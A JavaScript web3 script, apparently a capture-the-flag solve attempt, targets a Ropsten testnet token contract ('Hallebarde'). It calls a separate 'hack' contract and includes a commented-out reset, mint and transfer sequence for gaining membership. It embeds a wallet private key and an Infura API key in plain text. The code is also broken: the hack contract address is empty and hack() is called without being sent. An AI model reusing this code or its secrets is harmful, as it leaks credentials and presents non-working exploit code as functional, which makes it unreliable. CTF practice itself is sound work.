var Web3 = require("web3")
var ethers = require("ethers")

const API_URL = "https://ropsten.infura.io/v3/0c81b9e9bfa9442eae485ac59c3e3816"
const API_KEY = "0c81b9e9bfa9442eae485ac59c3e3816"
const address = "0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6"
const address_hack = ""
const privateKey = "de8d09dda7af7cff136acb6bfc90c44207a5e39346b52a9116d4c74aa2db2c94"

const web3 = new Web3(API_URL)
web3.eth.accounts.wallet.add(privateKey)

const abi = [
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "enterHallebarde",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "memberAddress",
				"type": "address"
			}
		],
		"name": "getMembershipStatus",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "uint256",
				"name": "numTokens",
				"type": "uint256"
			}
		],
		"name": "getMoney",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "reset",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "receiver",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "numTokens",
				"type": "uint256"
			}
		],
		"name": "transfer",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]

var abi_hack = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_addr",
				"type": "address"
			}
		],
		"name": "hack",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]


var contract = new web3.eth.Contract(abi_hack, address_hack, 
	{from: "0x87147243C317B6A8509c1E1629B9269532E7d6b4", gasPrice: '10000000000000', gas: 1000000});

//var contract = new web3.eth.Contract(abi, address, 
//	{from: "0x87147243C317B6A8509c1E1629B9269532E7d6b4", gasPrice: '10000000000000', gas: 1000000});

//contract.methods.reset().send()
//	.then(contract.methods.getMoney(10).send)
//	.then(function (st) {
//		console.log("Get money done with this logs\n" + JSON.stringify(st));
//		return contract.methods.transfer("0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6", 100).send(); })
//	.then(function (st) {
//		console.log("Transfer done with this logs\n" + JSON.stringify(st));
//		return contract.methods.enterHallebarde().call(); })
//	.then((st) => console.log("Entering hallebarde...\n" + JSON.stringify(st)))
//	.catch((err) => console.log("Error caught:\n" + JSON.stringify(err)))

contract.methods.hack(address).then(console.log)

